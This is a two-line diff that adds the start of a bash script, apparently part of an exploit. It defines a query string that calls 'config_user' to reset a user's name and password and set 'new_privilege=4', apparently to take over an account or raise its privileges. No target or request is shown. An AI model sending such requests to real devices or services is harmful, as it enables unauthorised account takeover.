@@ -1,0 +1,2 @@
+#!/bin/bash
+QSTRING="op=config_user&username=aaaaaaaa&original_username=1&password=aaaaaaaa&new_privilege=4"
